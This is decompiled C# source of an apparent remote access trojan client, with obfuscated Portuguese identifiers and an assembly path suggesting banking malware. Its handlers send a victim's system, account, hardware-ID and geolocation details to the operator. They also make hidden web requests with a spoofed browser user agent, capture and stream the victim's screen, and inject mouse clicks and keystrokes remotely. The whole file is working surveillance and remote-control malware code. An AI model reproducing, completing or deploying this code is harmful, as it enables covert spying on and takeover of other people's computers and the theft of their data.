// Decompiled with JetBrains decompiler
// Type: VERMELHO265MONARCA.Core.Commands.CALHAMBEQUE892INFLAMATORIO
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Windows.Forms;
using VERMELHO265MONARCA.Config;
using VERMELHO265MONARCA.Core.Helper;
using VERMELHO265MONARCA.Core.Networking;
using VERMELHO265MONARCA.Core.Packets.ClientPackets;
using VERMELHO265MONARCA.Core.Packets.ServerPackets;
using VERMELHO265MONARCA.Core.Utilities;
using VERMELHO265MONARCA.Enums;

namespace VERMELHO265MONARCA.Core.Commands
{
  public static class CALHAMBEQUE892INFLAMATORIO
  {
    private static Dictionary<int, string> _renamedFiles = new Dictionary<int, string>();
    private static Dictionary<int, string> _canceledDownloads = new Dictionary<int, string>();
    private static readonly System.Threading.Semaphore _limitThreads = new System.Threading.Semaphore(2, 2);
    public static UnsafeStreamCodec StreamCodec;
    private const string DELIMITER = "$E$";

    public static void HandleGetAuthentication(GetAuthentication command, Client client)
    {
      try
      {
        AMADELEITE205CACADOTES.Initialize();
      }
      catch
      {
      }
      new GetAuthenticationResponse(Settings.VERSION, PlatformHelper.FullName, WindowsAccountHelper.GetAccountType(), AMADELEITE205CACADOTES.GeoInfo.Country, AMADELEITE205CACADOTES.GeoInfo.Country, AMADELEITE205CACADOTES.GeoInfo.Region, AMADELEITE205CACADOTES.GeoInfo.City, AMADELEITE205CACADOTES.ImageIndex, SOCIAIS684DESCALABRO.HardwareId, WindowsAccountHelper.GetName(), SystemHelper.GetPcName(), Settings.TAG).Execute(client);
    }

    public static void HandleDoVisitWebsite(DoVisitWebsite command, Client client)
    {
      string str = command.URL;
      if (!str.StartsWith("http"))
        str = "http://" + str;
      if (!Uri.IsWellFormedUriString(str, UriKind.RelativeOrAbsolute))
        return;
      if (!command.Hidden)
      {
        Process.Start(str);
      }
      else
      {
        try
        {
          HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(str);
          httpWebRequest.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A";
          httpWebRequest.AllowAutoRedirect = true;
          httpWebRequest.Timeout = 10000;
          httpWebRequest.Method = "GET";
          using ((HttpWebResponse) httpWebRequest.GetResponse())
            ;
        }
        catch
        {
        }
      }
      new SetStatus("Visitado").Execute(client);
    }

    public static void DESCARTAVEL118ANJO(GetDesktop command, Client client)
    {
      string resolution = DEFEITUOSO43DESORDEM.FormatScreenResolution(ANDRAJOSO181CALUNIAR.GetBounds(command.Monitor));
      if (CALHAMBEQUE892INFLAMATORIO.StreamCodec == null)
        CALHAMBEQUE892INFLAMATORIO.StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);
      if (CALHAMBEQUE892INFLAMATORIO.StreamCodec.ImageQuality != command.Quality || CALHAMBEQUE892INFLAMATORIO.StreamCodec.Monitor != command.Monitor || CALHAMBEQUE892INFLAMATORIO.StreamCodec.Resolution != resolution)
      {
        if (CALHAMBEQUE892INFLAMATORIO.StreamCodec != null)
          CALHAMBEQUE892INFLAMATORIO.StreamCodec.Dispose();
        CALHAMBEQUE892INFLAMATORIO.StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);
      }
      BitmapData bitmapdata = (BitmapData) null;
      Bitmap bitmap = (Bitmap) null;
      try
      {
        bitmap = ANDRAJOSO181CALUNIAR.CaptureScreen(command.Monitor);
        bitmapdata = bitmap.LockBits(new Rectangle(0, 0, bitmap.Width, bitmap.Height), ImageLockMode.ReadWrite, bitmap.PixelFormat);
        using (MemoryStream memoryStream = new MemoryStream())
        {
          if (CALHAMBEQUE892INFLAMATORIO.StreamCodec == null)
            throw new Exception("");
          CALHAMBEQUE892INFLAMATORIO.StreamCodec.CodeImage(bitmapdata.Scan0, new Rectangle(0, 0, bitmap.Width, bitmap.Height), new Size(bitmap.Width, bitmap.Height), bitmap.PixelFormat, (Stream) memoryStream);
          new GetDesktopResponse(memoryStream.ToArray(), CALHAMBEQUE892INFLAMATORIO.StreamCodec.ImageQuality, CALHAMBEQUE892INFLAMATORIO.StreamCodec.Monitor, CALHAMBEQUE892INFLAMATORIO.StreamCodec.Resolution).Execute(client);
        }
      }
      catch (Exception ex)
      {
        if (CALHAMBEQUE892INFLAMATORIO.StreamCodec != null)
          new GetDesktopResponse((byte[]) null, CALHAMBEQUE892INFLAMATORIO.StreamCodec.ImageQuality, CALHAMBEQUE892INFLAMATORIO.StreamCodec.Monitor, CALHAMBEQUE892INFLAMATORIO.StreamCodec.Resolution).Execute(client);
        CALHAMBEQUE892INFLAMATORIO.StreamCodec = (UnsafeStreamCodec) null;
      }
      finally
      {
        if (bitmap != null)
        {
          if (bitmapdata != null)
          {
            try
            {
              bitmap.UnlockBits(bitmapdata);
            }
            catch
            {
            }
          }
          bitmap.Dispose();
        }
      }
    }

    public static void BEDEL75JACARE(DoMouseEvent command, Client client)
    {
      try
      {
        Screen[] allScreens = Screen.AllScreens;
        Rectangle bounds = allScreens[command.MonitorIndex].Bounds;
        int x = bounds.X;
        bounds = allScreens[command.MonitorIndex].Bounds;
        int y = bounds.Y;
        Point p = new Point(command.X + x, command.Y + y);
        switch (command.Action)
        {
          case MouseAction.LeftDown:
          case MouseAction.LeftUp:
          case MouseAction.RightDown:
          case MouseAction.RightUp:
          case MouseAction.MoveCursor:
            if (NativeMethodsHelper.IsScreensaverActive())
            {
              NativeMethodsHelper.DisableScreensaver();
              break;
            }
            break;
        }
        switch (command.Action)
        {
          case MouseAction.LeftDown:
          case MouseAction.LeftUp:
            NativeMethodsHelper.DoMouseLeftClick(p, command.IsMouseDown);
            break;
          case MouseAction.RightDown:
          case MouseAction.RightUp:
            NativeMethodsHelper.DoMouseRightClick(p, command.IsMouseDown);
            break;
          case MouseAction.MoveCursor:
            NativeMethodsHelper.DoMouseMove(p);
            break;
          case MouseAction.ScrollUp:
            NativeMethodsHelper.DoMouseScroll(p, false);
            break;
          case MouseAction.ScrollDown:
            NativeMethodsHelper.DoMouseScroll(p, true);
            break;
        }
      }
      catch
      {
      }
    }

    public static void HandleDoKeyboardEvent(DoKeyboardEvent command, Client client)
    {
      if (NativeMethodsHelper.IsScreensaverActive())
        NativeMethodsHelper.DisableScreensaver();
      NativeMethodsHelper.DoKeyPress(command.Key, command.KeyDown);
    }

    public static void HandleGetMonitors(GetMonitors command, Client client)
    {
      if ((uint) Screen.AllScreens.Length <= 0U)
        return;
      new GetMonitorsResponse(Screen.AllScreens.Length).Execute(client);
    }
  }
}
